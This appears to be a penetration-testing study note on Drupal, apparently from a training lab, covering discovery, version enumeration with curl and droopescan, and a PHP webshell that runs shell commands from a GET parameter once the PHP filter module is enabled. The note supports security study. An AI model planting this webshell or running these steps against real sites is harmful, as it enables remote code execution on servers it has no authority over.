# drupal

## Overview

## Discovery

```shell
curl -s http://drupal.inlanefreight.local | grep Drupal
```

## Enumeration

Get versions

```shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Use droopscan

```shell
droopescan scan drupal -u http://drupal.inlanefreight.local
```

### Webshell

In versions older than 8.0, it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated." This allows to add a Basic page with a webshell like:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```